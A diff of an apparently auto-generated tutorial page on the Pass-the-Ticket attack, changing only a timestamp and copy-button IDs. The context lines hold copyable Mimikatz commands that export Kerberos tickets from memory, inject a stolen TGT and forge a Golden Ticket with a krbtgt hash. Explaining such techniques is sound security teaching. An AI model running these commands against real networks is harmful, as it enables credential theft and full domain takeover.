@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 14:10 -->
+<!-- 2026-07-20 Mon 15:40 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Pass-the-Ticket</title>
@@ -942,11 +942,11 @@ To perform PtT, the attacker first harvests existing tickets from a machine wher
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_540deeb275184773872f788a9c3af67d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_e72aff6c211444b699ad59da7c2717f2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_540deeb275184773872f788a9c3af67d=document.querySelector('button[name=btn_540deeb275184773872f788a9c3af67d]');
-copyBtnbtn_540deeb275184773872f788a9c3af67d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Export all Kerberos tickets from memory to disk (.kirbi files)\nsekurlsa::tickets /export\n`);copyBtnbtn_540deeb275184773872f788a9c3af67d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_540deeb275184773872f788a9c3af67d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e72aff6c211444b699ad59da7c2717f2=document.querySelector('button[name=btn_e72aff6c211444b699ad59da7c2717f2]');
+copyBtnbtn_e72aff6c211444b699ad59da7c2717f2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Export all Kerberos tickets from memory to disk (.kirbi files)\nsekurlsa::tickets /export\n`);copyBtnbtn_e72aff6c211444b699ad59da7c2717f2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e72aff6c211444b699ad59da7c2717f2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -964,11 +964,11 @@ Once a .kirbi file is obtained, the attacker can use it on any other machine in 
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_f129a854507c431f83fc74ee78810534>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_4c83df86819d46d097df1faab80a4a3a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f129a854507c431f83fc74ee78810534=document.querySelector('button[name=btn_f129a854507c431f83fc74ee78810534]');
-copyBtnbtn_f129a854507c431f83fc74ee78810534.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Inject a specific stolen TGT into the current session\nkerberos::ptt [0;12d34]-krbtgt-DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi\n`);copyBtnbtn_f129a854507c431f83fc74ee78810534.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f129a854507c431f83fc74ee78810534.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4c83df86819d46d097df1faab80a4a3a=document.querySelector('button[name=btn_4c83df86819d46d097df1faab80a4a3a]');
+copyBtnbtn_4c83df86819d46d097df1faab80a4a3a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject a specific stolen TGT into the current session\nkerberos::ptt [0;12d34]-krbtgt-DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi\n`);copyBtnbtn_4c83df86819d46d097df1faab80a4a3a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4c83df86819d46d097df1faab80a4a3a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -986,11 +986,11 @@ A "Golden Ticket" is a special, forged TGT. By stealing the NTLM hash of the krb
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_f268f77bba50460eba529cc613a1bf42>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_694c329b101343a4adba26fded7b349b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f268f77bba50460eba529cc613a1bf42=document.querySelector('button[name=btn_f268f77bba50460eba529cc613a1bf42]');
-copyBtnbtn_f268f77bba50460eba529cc613a1bf42.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Creating a Golden Ticket for a fake 'Administrator'\nkerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-12345678-12345678-12345678 /krbtgt:ff11223344556677889900aabbccdd /id:500\n`);copyBtnbtn_f268f77bba50460eba529cc613a1bf42.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f268f77bba50460eba529cc613a1bf42.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_694c329b101343a4adba26fded7b349b=document.querySelector('button[name=btn_694c329b101343a4adba26fded7b349b]');
+copyBtnbtn_694c329b101343a4adba26fded7b349b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Creating a Golden Ticket for a fake 'Administrator'\nkerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-12345678-12345678-12345678 /krbtgt:ff11223344556677889900aabbccdd /id:500\n`);copyBtnbtn_694c329b101343a4adba26fded7b349b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_694c329b101343a4adba26fded7b349b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
